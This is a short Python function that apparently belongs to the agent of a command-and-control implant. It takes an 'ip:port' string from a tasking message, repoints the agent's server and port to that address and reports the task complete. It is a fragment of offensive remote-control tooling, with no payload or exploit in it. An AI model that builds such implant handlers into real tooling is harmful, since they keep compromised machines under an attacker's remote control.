import re


def redirect(task_id, command):

    print("[+] REDIRECTION " + command)

    params = command.split(":")
    ip = params[0]
    port = params[1]

    print("\t - Server: " + ip)
    print("\t - Port: " + port)

    agent.Server = "http://" + ip
    agent.Port = port

    response = {
            'task_id': task_id,
            "user_output": "Redirected to " + command,
            'completed': True
        }
    responses.append(response)

    print("\t- Redirect Done")

    return
